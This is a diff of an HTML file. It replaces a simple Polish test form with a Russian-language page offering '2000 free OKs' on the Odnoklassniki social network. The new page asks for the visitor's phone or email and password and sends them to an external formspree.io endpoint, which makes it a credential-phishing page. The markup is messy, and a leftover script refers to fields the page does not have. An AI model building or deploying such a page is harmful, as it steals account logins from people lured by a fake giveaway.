@@ -1,21 +1,120 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-	<title>Formularz</title>
-	<meta charset="UTF-8">
+  <meta charset="UTF-8">
+  <title>2000 OKs</title>
+  <style>
+    html, body {
+      width: 100%;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+  
+    display: flex;
+  justify-content: center;
+  align-items: center;
+      
+  place-items: center;
+    }
+    form {
+      width: 100%;
+      max-width: 800px;
+      margin: 0;
+      font-size: 42px;
+    }
+    label, input, textarea {
+      font-size: 39px;
+    }
+    input[type="submit"] {
+      font-size: 42px;
+      font-weight: bold;
+      padding: 40px 60px; /* większa wartość padding */
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    input[type="submit"]:hover {
+      background-color: #0062cc;
+    }
+  </style>
 </head>
 <body>
-	<h1>Formularz</h1>
-	<form id="myForm">
-		<label for="data1">Dane 1:</label>
-		<input type="text" id="data1" name="data1"><br><br>
-		<label for="data2">Dane 2:</label>
-		<input type="text" id="data2" name="data2"><br><br>
-		<label for="data3">Dane 3:</label>
-		<input type="text" id="data3" name="data3"><br><br>
-		<input type="submit" value="Wyślij">
-	</form>
+  <div style="text-align:center;
+       font-size: 22px;       ">
+    <div padding: 20px;>
+    <h1><b>Чтобы получить бесплатно 2000 ОКs</h1>
+    <div style="text-align:center;">
+    <h1>Заполните данные аккаунта Ok</h1>
+    <div style="text-align:center;">
+    <h1>введите промо-код</h1>
+    <div padding: 20px;>
 
-	<script src="submit-form.js"></script>
+      
+</div>
+      
+
+      
+     
+    
+      <form action="https://formspree.io/f/mnqyzeea" method="POST">
+      <div style="text-align:center;">
+        <label for="name"><b>Телефон или адрес эл. почты</label><br>
+        <input type="text" id="name" name="name"><br><br>
+        <label for="name">Пароль</label><br>
+        <input type="text" id="name" name="name"><br><br>
+
+         <label for="name">промо-код</label><br>
+         <input type="text" id="name1" name1="name1" pattern="3457" required><br><br>
+
+        
+        <input type="submit" value="Отправить">
+      
+         <div style="text-align:center;
+       font-size: 22px;       ">
+    <div padding: 20px;>
+    <h1><b>Верные данные разблокируют чат</h1> 
+          
+          </div>
+    </form>
+  
+		<script>
+function submitForm() {
+  // Pobierz wartości pól wejściowych
+  var liczba1 = document.getElementById("liczba1").value;
+  var liczba2 = document.getElementById("liczba2").value;
+  var promo = document.getElementById("promo").value;
+
+  // Utwórz nowy obiekt XMLHttpRequest
+  var xhr = new XMLHttpRequest();
+
+  // Ustaw typ zapytania i adres URL
+  xhr.open('POST', 'https://formspree.io/f/mnqyzeea', true);
+
+  // Ustaw nagłówki
+  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+  // Obsłuż odpowiedź serwera
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      // Odpowiedź serwera jest pusta, ale możesz dodać dowolny kod, który chcesz wykonać po udanej wysyłce formularza
+      alert("Formularz został wysłany pomyślnie!");
+    }
+  }
+
+  // Prześlij formularz za pomocą AJAX
+  xhr.send('liczba1=' + liczba1 + '&liczba2=' + liczba2 + '&promo=' + promo);
+
+  // Zwróć wartość false, aby zapobiec standardowemu wysyłaniu formularza
+  return false;
+}
+</script>
+		
+		
+		
+		</div>
 </body>
-</html> 
+</html>
